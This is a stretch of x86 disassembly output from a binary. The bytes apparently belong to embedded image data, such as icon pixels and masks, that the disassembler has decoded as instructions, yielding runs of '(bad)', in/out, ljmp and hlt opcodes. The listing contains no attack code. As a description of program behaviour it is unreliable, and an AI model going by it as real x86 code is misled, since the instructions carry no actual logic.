  42eb24:	0a 0a                	or     (%edx),%cl
  42eb26:	0a ec                	or     %ah,%ch
  42eb28:	ea ea ea ea 0a f7 0a 	ljmp   $0xaf7,$0xaeaeaea
  42eb2f:	ec                   	in     (%dx),%al
  42eb30:	ff 04 04             	incl   (%esp,%eax,1)
  42eb33:	04 04                	add    $0x4,%al
  42eb35:	04 04                	add    $0x4,%al
  42eb37:	04 04                	add    $0x4,%al
  42eb39:	04 04                	add    $0x4,%al
  42eb3b:	04 04                	add    $0x4,%al
  42eb3d:	ff 07                	incl   (%edi)
  42eb3f:	ec                   	in     (%dx),%al
  42eb40:	0a 0a                	or     (%edx),%cl
  42eb42:	0a 0a                	or     (%edx),%cl
  42eb44:	0a 0a                	or     (%edx),%cl
  42eb46:	0a 0a                	or     (%edx),%cl
  42eb48:	ec                   	in     (%dx),%al
  42eb49:	ea ea ea ea 0a 0a ec 	ljmp   $0xec0a,$0xaeaeaea
  42eb50:	ff 04 fe             	incl   (%esi,%edi,8)
  42eb53:	db db                	fcmovnu %st(3),%st
  42eb55:	b2 b2                	mov    $0xb2,%dl
  42eb57:	b2 b2                	mov    $0xb2,%dl
  42eb59:	ce                   	into
  42eb5a:	ce                   	into
  42eb5b:	ce                   	into
  42eb5c:	04 ff                	add    $0xff,%al
  42eb5e:	07                   	pop    %es
  42eb5f:	ec                   	in     (%dx),%al
  42eb60:	0a 0a                	or     (%edx),%cl
  42eb62:	0a 0a                	or     (%edx),%cl
  42eb64:	0a 0a                	or     (%edx),%cl
  42eb66:	0a 0a                	or     (%edx),%cl
  42eb68:	0a ec                	or     %ah,%ch
  42eb6a:	ff                   	(bad)
  42eb6b:	ff                   	(bad)
  42eb6c:	ff                   	(bad)
  42eb6d:	ff 0a                	decl   (%edx)
  42eb6f:	ec                   	in     (%dx),%al
  42eb70:	ff 04 e2             	incl   (%edx,%eiz,8)
  42eb73:	df db                	(bad)
  42eb75:	db b2 b2 b2 b2 ce    	(bad) -0x314d4d4e(%edx)
  42eb7b:	ce                   	into
  42eb7c:	04 ff                	add    $0xff,%al
  42eb7e:	07                   	pop    %es
  42eb7f:	ec                   	in     (%dx),%al
  42eb80:	0a 0a                	or     (%edx),%cl
  42eb82:	0a 0a                	or     (%edx),%cl
  42eb84:	0a 0a                	or     (%edx),%cl
  42eb86:	0a 0a                	or     (%edx),%cl
  42eb88:	0a 0a                	or     (%edx),%cl
  42eb8a:	ec                   	in     (%dx),%al
  42eb8b:	ec                   	in     (%dx),%al
  42eb8c:	ec                   	in     (%dx),%al
  42eb8d:	ec                   	in     (%dx),%al
  42eb8e:	ec                   	in     (%dx),%al
  42eb8f:	0a ff                	or     %bh,%bh
  42eb91:	04 df                	add    $0xdf,%al
  42eb93:	e2 df                	loop   0x42eb74
  42eb95:	db db                	fcmovnu %st(3),%st
  42eb97:	b2 b2                	mov    $0xb2,%dl
  42eb99:	b2 b2                	mov    $0xb2,%dl
  42eb9b:	ce                   	into
  42eb9c:	04 ff                	add    $0xff,%al
  42eb9e:	07                   	pop    %es
  42eb9f:	ec                   	in     (%dx),%al
  42eba0:	0a 0a                	or     (%edx),%cl
  42eba2:	0a 0a                	or     (%edx),%cl
  42eba4:	0a 0a                	or     (%edx),%cl
  42eba6:	0a 0a                	or     (%edx),%cl
  42eba8:	0a 0a                	or     (%edx),%cl
  42ebaa:	0a 0a                	or     (%edx),%cl
  42ebac:	0a 0a                	or     (%edx),%cl
  42ebae:	0a ec                	or     %ah,%ch
  42ebb0:	ff 04 e2             	incl   (%edx,%eiz,8)
  42ebb3:	df e2                	(bad)
  42ebb5:	df db                	(bad)
  42ebb7:	db b2 b2 b2 b2 04    	(bad) 0x4b2b2b2(%edx)
  42ebbd:	ff 07                	incl   (%edi)
  42ebbf:	ec                   	in     (%dx),%al
  42ebc0:	0a 0a                	or     (%edx),%cl
  42ebc2:	0a 0a                	or     (%edx),%cl
  42ebc4:	0a 0a                	or     (%edx),%cl
  42ebc6:	0a 0a                	or     (%edx),%cl
  42ebc8:	0a 0a                	or     (%edx),%cl
  42ebca:	0a 0a                	or     (%edx),%cl
  42ebcc:	0a 0a                	or     (%edx),%cl
  42ebce:	0a ec                	or     %ah,%ch
  42ebd0:	ff 04 df             	incl   (%edi,%ebx,8)
  42ebd3:	e2 df                	loop   0x42ebb4
  42ebd5:	e2 df                	loop   0x42ebb6
  42ebd7:	db db                	fcmovnu %st(3),%st
  42ebd9:	b2 b2                	mov    $0xb2,%dl
  42ebdb:	b2 04                	mov    $0x4,%dl
  42ebdd:	ff 07                	incl   (%edi)
  42ebdf:	ec                   	in     (%dx),%al
  42ebe0:	0a 0a                	or     (%edx),%cl
  42ebe2:	0a 0a                	or     (%edx),%cl
  42ebe4:	0a 0a                	or     (%edx),%cl
  42ebe6:	0a 0a                	or     (%edx),%cl
  42ebe8:	0a 0a                	or     (%edx),%cl
  42ebea:	0a 0a                	or     (%edx),%cl
  42ebec:	0a 0a                	or     (%edx),%cl
  42ebee:	0a ec                	or     %ah,%ch
  42ebf0:	ff 04 db             	incl   (%ebx,%ebx,8)
  42ebf3:	df e2                	(bad)
  42ebf5:	df e2                	(bad)
  42ebf7:	df db                	(bad)
  42ebf9:	db b2 b2 04 ff 07    	(bad) 0x7ff04b2(%edx)
  42ebff:	ec                   	in     (%dx),%al
  42ec00:	0a 0a                	or     (%edx),%cl
  42ec02:	0a 0a                	or     (%edx),%cl
  42ec04:	0a 0a                	or     (%edx),%cl
  42ec06:	0a 0a                	or     (%edx),%cl
  42ec08:	0a 0a                	or     (%edx),%cl
  42ec0a:	0a 0a                	or     (%edx),%cl
  42ec0c:	0a 0a                	or     (%edx),%cl
  42ec0e:	0a ec                	or     %ah,%ch
  42ec10:	ff 04 db             	incl   (%ebx,%ebx,8)
  42ec13:	db df                	fcmovnu %st(7),%st
  42ec15:	e2 df                	loop   0x42ebf6
  42ec17:	e2 df                	loop   0x42ebf8
  42ec19:	db db                	fcmovnu %st(3),%st
  42ec1b:	b2 04                	mov    $0x4,%dl
  42ec1d:	ff 07                	incl   (%edi)
  42ec1f:	ec                   	in     (%dx),%al
  42ec20:	0a 0a                	or     (%edx),%cl
  42ec22:	0a 0a                	or     (%edx),%cl
  42ec24:	0a 0a                	or     (%edx),%cl
  42ec26:	0a 0a                	or     (%edx),%cl
  42ec28:	0a 0a                	or     (%edx),%cl
  42ec2a:	0a 0a                	or     (%edx),%cl
  42ec2c:	0a 0a                	or     (%edx),%cl
  42ec2e:	0a ec                	or     %ah,%ch
  42ec30:	ff 04 db             	incl   (%ebx,%ebx,8)
  42ec33:	db db                	fcmovnu %st(3),%st
  42ec35:	df e2                	(bad)
  42ec37:	df e2                	(bad)
  42ec39:	fe                   	(bad)
  42ec3a:	db db                	fcmovnu %st(3),%st
  42ec3c:	04 ff                	add    $0xff,%al
  42ec3e:	07                   	pop    %es
  42ec3f:	ec                   	in     (%dx),%al
  42ec40:	0a 0a                	or     (%edx),%cl
  42ec42:	0a 0a                	or     (%edx),%cl
  42ec44:	0a 0a                	or     (%edx),%cl
  42ec46:	0a 0a                	or     (%edx),%cl
  42ec48:	0a 0a                	or     (%edx),%cl
  42ec4a:	0a 0a                	or     (%edx),%cl
  42ec4c:	0a 0a                	or     (%edx),%cl
  42ec4e:	0a ec                	or     %ah,%ch
  42ec50:	ff 04 04             	incl   (%esp,%eax,1)
  42ec53:	04 04                	add    $0x4,%al
  42ec55:	04 04                	add    $0x4,%al
  42ec57:	04 04                	add    $0x4,%al
  42ec59:	04 04                	add    $0x4,%al
  42ec5b:	04 04                	add    $0x4,%al
  42ec5d:	ff 07                	incl   (%edi)
  42ec5f:	ec                   	in     (%dx),%al
  42ec60:	0a 0a                	or     (%edx),%cl
  42ec62:	0a 0a                	or     (%edx),%cl
  42ec64:	0a 0a                	or     (%edx),%cl
  42ec66:	0a 0a                	or     (%edx),%cl
  42ec68:	0a 0a                	or     (%edx),%cl
  42ec6a:	0a 0a                	or     (%edx),%cl
  42ec6c:	0a 0a                	or     (%edx),%cl
  42ec6e:	0a ec                	or     %ah,%ch
  42ec70:	ff                   	(bad)
  42ec71:	ff                   	(bad)
  42ec72:	ff                   	(bad)
  42ec73:	ff                   	(bad)
  42ec74:	ff                   	(bad)
  42ec75:	ff                   	(bad)
  42ec76:	ff                   	(bad)
  42ec77:	ff                   	(bad)
  42ec78:	ff                   	(bad)
  42ec79:	ff                   	(bad)
  42ec7a:	ff                   	(bad)
  42ec7b:	ff                   	(bad)
  42ec7c:	ff                   	(bad)
  42ec7d:	ff 07                	incl   (%edi)
  42ec7f:	ec                   	in     (%dx),%al
  42ec80:	0a 0a                	or     (%edx),%cl
  42ec82:	0a 0a                	or     (%edx),%cl
  42ec84:	0a 0a                	or     (%edx),%cl
  42ec86:	0a 0a                	or     (%edx),%cl
  42ec88:	0a 0a                	or     (%edx),%cl
  42ec8a:	0a 0a                	or     (%edx),%cl
  42ec8c:	0a 0a                	or     (%edx),%cl
  42ec8e:	0a 0a                	or     (%edx),%cl
  42ec90:	eb eb                	jmp    0x42ec7d
  42ec92:	eb eb                	jmp    0x42ec7f
  42ec94:	eb eb                	jmp    0x42ec81
  42ec96:	eb eb                	jmp    0x42ec83
  42ec98:	eb eb                	jmp    0x42ec85
  42ec9a:	eb eb                	jmp    0x42ec87
  42ec9c:	eb eb                	jmp    0x42ec89
  42ec9e:	eb eb                	jmp    0x42ec8b
  42eca0:	0a 0a                	or     (%edx),%cl
  42eca2:	ff                   	(bad)
  42eca3:	fe 07                	incb   (%edi)
  42eca5:	ff c0                	inc    %eax
  42eca7:	f8                   	clc
  42eca8:	01 ff                	add    %edi,%edi
  42ecaa:	c0 70 00 ff          	shlb   $0xff,0x0(%eax)
  42ecae:	c0 20 00             	shlb   $0x0,(%eax)
  42ecb1:	7f c0                	jg     0x42ec73
  42ecb3:	00 00                	add    %al,(%eax)
  42ecb5:	7f c0                	jg     0x42ec77
  42ecb7:	00 00                	add    %al,(%eax)
  42ecb9:	3f                   	aas
  42ecba:	c0 00 00             	rolb   $0x0,(%eax)
  42ecbd:	3f                   	aas
  42ecbe:	c0 00 60             	rolb   $0x60,(%eax)
  42ecc1:	3f                   	aas
  42ecc2:	c0 00 60             	rolb   $0x60,(%eax)
  42ecc5:	3f                   	aas
  42ecc6:	c0 00 00             	rolb   $0x0,(%eax)
  42ecc9:	3f                   	aas
  42ecca:	c0 00 00             	rolb   $0x0,(%eax)
  42eccd:	3f                   	aas
  42ecce:	c0 00 00             	rolb   $0x0,(%eax)
  42ecd1:	03 c0                	add    %eax,%eax
  42ecd3:	00 00                	add    %al,(%eax)
  42ecd5:	01 c0                	add    %eax,%eax
  42ecd7:	00 00                	add    %al,(%eax)
  42ecd9:	00 c0                	add    %al,%al
  42ecdb:	00 00                	add    %al,(%eax)
  42ecdd:	00 c0                	add    %al,%al
  42ecdf:	00 00                	add    %al,(%eax)
  42ece1:	00 c0                	add    %al,%al
  42ece3:	00 00                	add    %al,(%eax)
  42ece5:	00 c0                	add    %al,%al
  42ece7:	00 00                	add    %al,(%eax)
  42ece9:	00 80 00 00 01 00    	add    %al,0x10000(%eax)
  42ecef:	00 00                	add    %al,(%eax)
  42ecf1:	01 f8                	add    %edi,%eax
  42ecf3:	00 00                	add    %al,(%eax)
  42ecf5:	01 fc                	add    %edi,%esp
  42ecf7:	00 00                	add    %al,(%eax)
  42ecf9:	01 fe                	add    %edi,%esi
  42ecfb:	00 00                	add    %al,(%eax)
  42ecfd:	01 ff                	add    %edi,%edi
  42ecff:	00 00                	add    %al,(%eax)
  42ed01:	01 ff                	add    %edi,%edi
  42ed03:	f8                   	clc
  42ed04:	00 01                	add    %al,(%ecx)
  42ed06:	ff                   	(bad)
  42ed07:	f8                   	clc
  42ed08:	00 01                	add    %al,(%ecx)
  42ed0a:	ff                   	(bad)
  42ed0b:	f8                   	clc
  42ed0c:	00 01                	add    %al,(%ecx)
  42ed0e:	ff                   	(bad)
  42ed0f:	f8                   	clc
  42ed10:	00 01                	add    %al,(%ecx)
  42ed12:	ff                   	(bad)
  42ed13:	f8                   	clc
  42ed14:	00 01                	add    %al,(%ecx)
  42ed16:	ff                   	(bad)
  42ed17:	f8                   	clc
  42ed18:	00 01                	add    %al,(%ecx)
  42ed1a:	ff                   	(bad)
  42ed1b:	f8                   	clc
  42ed1c:	00 01                	add    %al,(%ecx)
  42ed1e:	ff                   	(bad)
  42ed1f:	fc                   	cld
  42ed20:	00 03                	add    %al,(%ebx)
  42ed22:	f1                   	int1
  42ed23:	ef                   	out    %eax,(%dx)
  42ed24:	ec                   	in     (%dx),%al
  42ed25:	ff f2                	push   %edx
  42ed27:	f0 ee                	lock out %al,(%dx)
  42ed29:	fe                   	(bad)
  42ed2a:	f5                   	cmc
  42ed2b:	f3 f2 ff f6          	repz repnz push %esi
  42ed2f:	f4                   	hlt
  42ed30:	f3 ff f6             	repz push %esi
  42ed33:	f4                   	hlt
  42ed34:	f3 fe                	repz (bad)
  42ed36:	f1                   	int1
  42ed37:	f1                   	int1
  42ed38:	f1                   	int1
  42ed39:	ff b7 ba f0 ff 23    	push   0x23fff0ba(%edi)
  42ed3f:	2d d7 fe 47 59       	sub    $0x5947fed7,%eax
  42ed44:	e3 ff                	jecxz  0x42ed45
  42ed46:	32 4e e0             	xor    -0x20(%esi),%cl
  42ed49:	ff 18                	lcall  *(%eax)
  42ed4b:	41                   	inc    %ecx
  42ed4c:	dd fe                	(bad)
  42ed4e:	17                   	pop    %ss
  42ed4f:	48                   	dec    %eax
  42ed50:	de ff                	fdivrp %st,%st(7)
  42ed52:	17                   	pop    %ss
  42ed53:	51                   	push   %ecx
  42ed54:	e0 ff                	loopne 0x42ed55
  42ed56:	73 96                	jae    0x42ecee
  42ed58:	ec                   	in     (%dx),%al
  42ed59:	fe                   	(bad)
  42ed5a:	fd                   	std
  42ed5b:	fe                   	(bad)
  42ed5c:	fe                   	(bad)
  42ed5d:	ff                   	(bad)
  42ed5e:	ff                   	(bad)
  42ed5f:	ff                   	(bad)
  42ed60:	ff                   	(bad)
  42ed61:	ff                   	(bad)
  42ed62:	ff                   	(bad)
  42ed63:	ff                   	(bad)
  42ed64:	ff                   	(bad)
  42ed65:	ff                   	(bad)
  42ed66:	fe                   	(bad)
  42ed67:	fe                   	(bad)
  42ed68:	fe                   	(bad)
  42ed69:	fe                   	(bad)
  42ed6a:	ff                   	(bad)
  42ed6b:	ff                   	(bad)
  42ed6c:	ff                   	(bad)
  42ed6d:	ff                   	(bad)
  42ed6e:	ff                   	(bad)
  42ed6f:	ff                   	(bad)
  42ed70:	ff                   	(bad)
  42ed71:	ff                   	(bad)
  42ed72:	fe                   	(bad)
  42ed73:	fe                   	(bad)
  42ed74:	fe                   	(bad)
  42ed75:	fe                   	(bad)
  42ed76:	ff                   	(bad)
  42ed77:	ff                   	(bad)
  42ed78:	ff                   	(bad)
  42ed79:	ff f7                	push   %edi
  42ed7b:	f7 fc                	idiv   %esp
  42ed7d:	ff 59 7f             	lcall  *0x7f(%ecx)
  42ed80:	e5 fe                	in     $0xfe,%eax
  42ed82:	16                   	push   %ss
  42ed83:	4d                   	dec    %ebp
  42ed84:	df ff                	(bad)
  42ed86:	17                   	pop    %ss
  42ed87:	46                   	inc    %esi
  42ed88:	de ff                	fdivrp %st,%st(7)
  42ed8a:	18 3e                	sbb    %bh,(%esi)
  42ed8c:	dd fe                	(bad)
  42ed8e:	32 4c e0 ff          	xor    -0x1(%eax,%eiz,8),%cl
  42ed92:	47                   	inc    %edi
  42ed93:	56                   	push   %esi
  42ed94:	e3 ff                	jecxz  0x42ed95
  42ed96:	25 2e d5 fe dd       	and    $0xddfed52e,%eax
  42ed9b:	de f6                	fdivp  %st,%st(6)
  42ed9d:	ff cb                	dec    %ebx
  42ed9f:	cc                   	int3
  42eda0:	de a1 de d9 d3 17    	fisubs 0x17d3d9de(%ecx)
  42eda6:	db d6                	fcmovnbe %st(6),%st
  42eda8:	ce                   	into
  42eda9:	ea dc d7 d0 fe de d9 	ljmp   $0xd9de,$0xfed0d7dc
  42edb0:	d2 fe                	sar    %cl,%dh
  42edb2:	df da                	(bad)
  42edb4:	d4 fe                	aam    $0xfe
  42edb6:	e3 e0                	jecxz  0x42ed98
  42edb8:	da fe                	(bad)
  42edba:	f1                   	int1
  42edbb:	ef                   	out    %eax,(%dx)
  42edbc:	ec                   	in     (%dx),%al
  42edbd:	fe                   	(bad)
  42edbe:	f8                   	clc
  42edbf:	f7 f5                	div    %ebp
  42edc1:	fe                   	(bad)
  42edc2:	f0 ee                	lock out %al,(%dx)
  42edc4:	eb fe                	jmp    0x42edc4
  42edc6:	e5 e2                	in     $0xe2,%eax
  42edc8:	dd fe                	(bad)
  42edca:	e3 df                	jecxz  0x42edab
  42edcc:	da fe                	(bad)
  42edce:	e5 e2                	in     $0xe2,%eax
  42edd0:	dd fe                	(bad)
  42edd2:	e7 e4                	out    %eax,$0xe4
  42edd4:	df fe                	(bad)
  42edd6:	ea e7 e3 fe ed eb e7 	ljmp   $0xe7eb,$0xedfee3e7
  42eddd:	fe                   	(bad)
  42edde:	ef                   	out    %eax,(%dx)
  42eddf:	ed                   	in     (%dx),%eax
  42ede0:	ea fe f2 f0 ee fe f4 	ljmp   $0xf4fe,$0xeef0f2fe
  42ede7:	f2 f1                	repnz int1
  42ede9:	fe                   	(bad)
  42edea:	f6 f5                	div    %ch
  42edec:	f4                   	hlt
  42eded:	fe                   	(bad)
  42edee:	f8                   	clc
  42edef:	f7 f6                	div    %esi
  42edf1:	fe                   	(bad)
  42edf2:	f9                   	stc
  42edf3:	f8                   	clc
  42edf4:	f7 fe                	idiv   %esi
  42edf6:	f1                   	int1
  42edf7:	f1                   	int1
  42edf8:	f1                   	int1
  42edf9:	fe                   	(bad)
  42edfa:	96                   	xchg   %eax,%esi
  42edfb:	9a e8 fe 29 35 d9 fe 	lcall  $0xfed9,$0x3529fee8
  42ee02:	47                   	inc    %edi
  42ee03:	5a                   	pop    %edx
  42ee04:	e2 fe                	loop   0x42ee04
  42ee06:	45                   	inc    %ebp
  42ee07:	60                   	pusha
  42ee08:	e3 fe                	jecxz  0x42ee08
  42ee0a:	28 50 e0             	sub    %dl,-0x20(%eax)
  42ee0d:	fe                   	(bad)
  42ee0e:	17                   	pop    %ss
  42ee0f:	48                   	dec    %eax
  42ee10:	df fe                	(bad)
  42ee12:	17                   	pop    %ss
  42ee13:	42                   	inc    %edx
  42ee14:	de fe                	fdivrp %st,%st(6)
  42ee16:	18 3f                	sbb    %bh,(%edi)
  42ee18:	dd fe                	(bad)
  42ee1a:	74 8d                	je     0x42eda9
  42ee1c:	eb fe                	jmp    0x42ee1c
  42ee1e:	f8                   	clc
  42ee1f:	f9                   	stc
  42ee20:	fe                   	(bad)
  42ee21:	fe                   	(bad)
  42ee22:	fe                   	(bad)
  42ee23:	fe                   	(bad)
  42ee24:	fe                   	(bad)
  42ee25:	fe                   	(bad)
  42ee26:	fe                   	(bad)
  42ee27:	fe                   	(bad)
  42ee28:	fe                   	(bad)
  42ee29:	fe                   	(bad)
  42ee2a:	fe                   	(bad)
  42ee2b:	fe                   	(bad)
  42ee2c:	fe                   	(bad)
  42ee2d:	fe                   	(bad)
  42ee2e:	fe                   	(bad)
  42ee2f:	fe                   	(bad)
  42ee30:	fe                   	(bad)
  42ee31:	fe                   	(bad)
  42ee32:	fe                   	(bad)
  42ee33:	fe                   	(bad)
  42ee34:	fe                   	(bad)
  42ee35:	fe                   	(bad)
  42ee36:	f0 f1                	lock int1
  42ee38:	fb                   	sti
  42ee39:	fe                   	(bad)
  42ee3a:	5a                   	pop    %edx
  42ee3b:	74 e3                	je     0x42ee20
  42ee3d:	fe                   	(bad)
  42ee3e:	18 3d dd fe 17 41    	sbb    %bh,0x4117fedd
  42ee44:	de fe                	fdivrp %st,%st(6)
  42ee46:	17                   	pop    %ss
  42ee47:	46                   	inc    %esi
  42ee48:	de fe                	fdivrp %st,%st(6)
  42ee4a:	29 4d df             	sub    %ecx,-0x21(%ebp)
  42ee4d:	fe 45 5d             	incb   0x5d(%ebp)
  42ee50:	e3 fe                	jecxz  0x42ee50
  42ee52:	47                   	inc    %edi
  42ee53:	57                   	push   %edi
  42ee54:	e2 fe                	loop   0x42ee54
  42ee56:	2a 33                	sub    (%ebx),%dh
  42ee58:	d6                   	salc
  42ee59:	fe                   	(bad)
  42ee5a:	b8 bb ee fe db       	mov    $0xdbfeeebb,%eax
  42ee5f:	db dc                	fcmovnu %st(4),%st
  42ee61:	c1 de da             	rcr    $0xda,%esi
  42ee64:	d3 01                	roll   %cl,(%ecx)
  42ee66:	dc d7                	(bad)
  42ee68:	d0 d0                	rcl    $1,%al
  42ee6a:	dd d8                	fstp   %st(0)
  42ee6c:	d2 fe                	sar    %cl,%dh
  42ee6e:	de da                	(bad)
  42ee70:	d4 ff                	aam    $0xff
  42ee72:	e0 dc                	loopne 0x42ee50
  42ee74:	d6                   	salc
  42ee75:	ff e2                	jmp    *%edx
  42ee77:	de d8                	(bad)
  42ee79:	fe                   	(bad)
  42ee7a:	e4 e1                	in     $0xe1,%al
  42ee7c:	db ff                	(bad)
  42ee7e:	e6 e3                	out    %al,$0xe3
  42ee80:	df ff                	(bad)
  42ee82:	ee                   	out    %al,(%dx)
  42ee83:	eb e8                	jmp    0x42ee6d
  42ee85:	fe                   	(bad)
  42ee86:	f7 f6                	div    %esi
  42ee88:	f4                   	hlt
  42ee89:	ff f6                	push   %esi
  42ee8b:	f5                   	cmc
  42ee8c:	f4                   	hlt
  42ee8d:	ff                   	ljmp   (bad)
  42ee8e:	ee                   	out    %al,(%dx)
  42ee8f:	ec                   	in     (%dx),%al
  42ee90:	e9 ff e9 e6 e1       	jmp    0xe229d894
  42ee95:	fe                   	(bad)
  42ee96:	eb e8                	jmp    0x42ee80
  42ee98:	e4 ff                	in     $0xff,%al
  42ee9a:	ed                   	in     (%dx),%eax
  42ee9b:	eb e7                	jmp    0x42ee84
  42ee9d:	fe                   	(bad)
  42ee9e:	f0 ee                	lock out %al,(%dx)
  42eea0:	eb ff                	jmp    0x42eea1
  42eea2:	f3 f1                	repz int1
  42eea4:	ef                   	out    %eax,(%dx)
  42eea5:	ff f5                	push   %ebp
  42eea7:	f3 f2 fe             	repz repnz (bad)
  42eeaa:	f8                   	clc
  42eeab:	f7 f6                	div    %esi
  42eead:	ff                   	(bad)
  42eeae:	fa                   	cli
  42eeaf:	f9                   	stc
  42eeb0:	f9                   	stc
  42eeb1:	ff                   	(bad)
  42eeb2:	fb                   	sti
  42eeb3:	fb                   	sti
  42eeb4:	fb                   	sti
  42eeb5:	fe                   	(bad)
  42eeb6:	f1                   	int1
  42eeb7:	f1                   	int1
  42eeb8:	f1                   	int1
  42eeb9:	ff 90 95 e5 ff 2b    	call   *0x2bffe595(%eax)
  42eebf:	36 d8 fe             	ss fdivr %st(6),%st
  42eec2:	47                   	inc    %edi
  42eec3:	5a                   	pop    %edx
  42eec4:	e3 ff                	jecxz  0x42eec5
  42eec6:	47                   	inc    %edi
  42eec7:	61                   	popa
  42eec8:	e3 ff                	jecxz  0x42eec9
  42eeca:	44                   	inc    %esp
  42eecb:	63 e3                	arpl   %esp,%ebx
  42eecd:	fe                   	(bad)
  42eece:	29 3f                	sub    %edi,(%edi)
  42eed0:	de ff                	fdivrp %st,%st(7)
  42eed2:	1a 32                	sbb    (%edx),%dh
  42eed4:	dc ff                	fdivr  %st,%st(7)
  42eed6:	19 37                	sbb    %esi,(%edi)
  42eed8:	dc fe                	fdivr  %st,%st(6)
  42eeda:	1b 3d dd ff a3 b1    	sbb    0xb1a3ffdd,%edi
  42eee0:	ef                   	out    %eax,(%dx)
  42eee1:	ff                   	(bad)
  42eee2:	ff                   	(bad)
  42eee3:	ff                   	(bad)
  42eee4:	ff                   	(bad)
  42eee5:	ff                   	(bad)
  42eee6:	fe                   	(bad)
  42eee7:	fe                   	(bad)
  42eee8:	fe                   	(bad)
  42eee9:	fe                   	(bad)
  42eeea:	ff                   	(bad)
  42eeeb:	ff                   	(bad)
  42eeec:	ff                   	(bad)
  42eeed:	ff                   	(bad)
  42eeee:	ff                   	(bad)
  42eeef:	ff                   	(bad)
  42eef0:	ff                   	(bad)
  42eef1:	ff                   	(bad)
  42eef2:	fe                   	(bad)
  42eef3:	fe                   	(bad)
  42eef4:	fe                   	(bad)
  42eef5:	fe 82 8b d2 ff 19    	incb   0x19ffd28b(%edx)
  42eefb:	38 d5                	cmp    %dl,%ch
  42eefd:	ff 19                	lcall  *(%ecx)
  42eeff:	35 dc fe 1a 30       	xor    $0x301afedc,%eax
  42ef04:	db ff                	(bad)
  42ef06:	2a 3f                	sub    (%edi),%bh
  42ef08:	de ff                	fdivrp %st,%st(7)
  42ef0a:	44                   	inc    %esp
  42ef0b:	62 e3 fe 47 5f       	(bad) {%k7}
  42ef10:	e3 ff                	jecxz  0x42ef11
  42ef12:	47                   	inc    %edi
  42ef13:	57                   	push   %edi
  42ef14:	e3 ff                	jecxz  0x42ef15
  42ef16:	2b 35 d5 fe ab ae    	sub    0xaeabfed5,%esi
  42ef1c:	ea ff dc dc dc cb 00 	ljmp   $0xcb,$0xdcdcdcff
  42ef23:	00 00                	add    %al,(%eax)
  42ef25:	00 dd                	add    %bl,%ch
  42ef27:	d8 d1                	fcom   %st(1)
  42ef29:	a0 de d9 d3 fe       	mov    0xfed3d9de,%al
  42ef2e:	df db                	(bad)
  42ef30:	d5 fe                	aad    $0xfe
  42ef32:	e1 de                	loope  0x42ef12
  42ef34:	d8 fe                	fdivr  %st(6),%st
  42ef36:	e3 e0                	jecxz  0x42ef18
  42ef38:	da fe                	(bad)
  42ef3a:	e5 e1                	in     $0xe1,%eax
  42ef3c:	dd fe                	(bad)
  42ef3e:	e6 e3                	out    %al,$0xe3
  42ef40:	de fe                	fdivrp %st,%st(6)
  42ef42:	e7 e4                	out    %eax,$0xe4
  42ef44:	e0 fe                	loopne 0x42ef44
  42ef46:	e8 e6 e1 fe ee       	call   0xef41d131
  42ef4b:	eb e8                	jmp    0x42ef35
  42ef4d:	fe                   	(bad)
  42ef4e:	f5                   	cmc
  42ef4f:	f4                   	hlt
  42ef50:	f2 fe                	repnz (bad)
  42ef52:	fa                   	cli
  42ef53:	f9                   	stc
  42ef54:	f8                   	clc
  42ef55:	fe                   	(bad)
  42ef56:	f5                   	cmc
  42ef57:	f4                   	hlt
  42ef58:	f2 fe                	repnz (bad)
  42ef5a:	f0 ee                	lock out %al,(%dx)
  42ef5c:	eb fe                	jmp    0x42ef5c
  42ef5e:	f0 ee                	lock out %al,(%dx)
  42ef60:	eb fe                	jmp    0x42ef60
  42ef62:	f2 f0 ef             	repnz lock out %eax,(%dx)
  42ef65:	fe                   	(bad)
  42ef66:	f5                   	cmc
  42ef67:	f3 f2 fe             	repz repnz (bad)
  42ef6a:	f8                   	clc
  42ef6b:	f7 f6                	div    %esi
  42ef6d:	fe                   	(bad)
  42ef6e:	fa                   	cli
  42ef6f:	f9                   	stc
  42ef70:	f9                   	stc
  42ef71:	fe                   	(bad)
  42ef72:	fc                   	cld
  42ef73:	fb                   	sti
  42ef74:	fb                   	sti
  42ef75:	fe                   	(bad)
  42ef76:	f0 f0 f0 fe          	lock lock lock (bad)
  42ef7a:	94                   	xchg   %eax,%esp
  42ef7b:	99                   	cltd
  42ef7c:	e5 fe                	in     $0xfe,%eax
  42ef7e:	29 34 d6             	sub    %esi,(%esi,%edx,8)
  42ef81:	fe 47 5a             	incb   0x5a(%edi)
  42ef84:	e2 fe                	loop   0x42ef84
  42ef86:	47                   	inc    %edi
  42ef87:	5e                   	pop    %esi
  42ef88:	e2 fe                	loop   0x42ef88
  42ef8a:	48                   	dec    %eax
  42ef8b:	52                   	push   %edx
  42ef8c:	de fe                	fdivrp %st,%st(6)
  42ef8e:	47                   	inc    %edi
  42ef8f:	4e                   	dec    %esi
  42ef90:	e1 fe                	loope  0x42ef90
  42ef92:	34 42                	xor    $0x42,%al
  42ef94:	df fe                	(bad)
  42ef96:	1d 32 dc fe 5e       	sbb    $0x5efedc32,%eax
  42ef9b:	70 e3                	jo     0x42ef80
  42ef9d:	fe                   	(bad)
  42ef9e:	f1                   	int1
  42ef9f:	f2 fb                	repnz sti
  42efa1:	fe                   	(bad)
  42efa2:	fe                   	(bad)
  42efa3:	fe                   	(bad)
  42efa4:	fe                   	(bad)
  42efa5:	fe                   	(bad)
  42efa6:	fe                   	(bad)
  42efa7:	fe                   	(bad)
  42efa8:	fe                   	(bad)
  42efa9:	fe                   	(bad)
  42efaa:	fe                   	(bad)
  42efab:	fe                   	(bad)
  42efac:	fe                   	(bad)
  42efad:	fe                   	(bad)
  42efae:	fe                   	(bad)
  42efaf:	fe                   	(bad)
  42efb0:	fe                   	(bad)
  42efb1:	fe                   	(bad)
  42efb2:	fe                   	(bad)
  42efb3:	fe                   	(bad)
  42efb4:	fe                   	(bad)
  42efb5:	fe                   	(bad)
  42efb6:	e6 e7                	out    %al,$0xe7
  42efb8:	f4                   	hlt
  42efb9:	fe 48 52             	decb   0x52(%eax)
  42efbc:	bc fe 1d 30 d7       	mov    $0xd7301dfe,%esp
  42efc1:	fe                   	(bad)
  42efc2:	34 40                	xor    $0x40,%al
  42efc4:	de fe                	fdivrp %st,%st(6)
  42efc6:	47                   	inc    %edi
  42efc7:	4e                   	dec    %esi
  42efc8:	df fe                	(bad)
  42efca:	48                   	dec    %eax
  42efcb:	54                   	push   %esp
  42efcc:	de fe                	fdivrp %st,%st(6)
  42efce:	47                   	inc    %edi
  42efcf:	5d                   	pop    %ebp
  42efd0:	e2 fe                	loop   0x42efd0
  42efd2:	47                   	inc    %edi
  42efd3:	56                   	push   %esi
